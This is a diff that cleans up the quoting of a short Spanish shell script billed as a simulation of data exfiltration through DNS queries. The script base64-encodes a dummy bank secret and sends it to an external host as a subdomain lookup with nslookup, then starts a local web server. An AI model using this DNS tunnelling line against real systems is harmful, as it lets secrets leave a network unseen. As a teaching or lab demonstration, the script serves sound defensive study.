@@ -1,15 +1,15 @@
-#! /bin/sh
+#!/bin/sh
 
-DATOS_SENSIBLES= " clave_secreta_banco_2026 " 
-DATOS_CODIFICADOS= $( echo -n " ​​$DATOS_SENSIBLES "  | base64 | tr -d ' = ' )
+DATOS_SENSIBLES="clave_secreta_banco_2026"
+DATOS_CODIFICADOS=$(echo -n "$DATOS_SENSIBLES" | base64 | tr -d '=')
 
-echo  " === SIMULACIÓN: EXFILTRACIÓN DE DATOS VÍA CONSULTAS DNS === "
- echo  " Dato original: $DATOS_SENSIBLES "
- echo  " Dato codificado: $DATOS_CODIFICADOS "
- echo  " Enviando consulta DNS con el payload incrustado... "
+echo "=== SIMULACIÓN: EXFILTRACIÓN DE DATOS VÍA CONSULTAS DNS ==="
+echo "Dato original: $DATOS_SENSIBLES"
+echo "Dato codificado: $DATOS_CODIFICADOS"
+echo "Enviando consulta DNS con el payload incrustado..."
 
-nslookup " ${DATOS_CODIFICADOS} .servidor-web-dmz.onrender.com "
+nslookup "${DATOS_CODIFICADOS}.servidor-web-dmz.onrender.com"
 
-echo  " === CONSULTA DNS ENVIADA === "
+echo "=== CONSULTA DNS ENVIADA ==="
 
 python3 -m http.server 8080
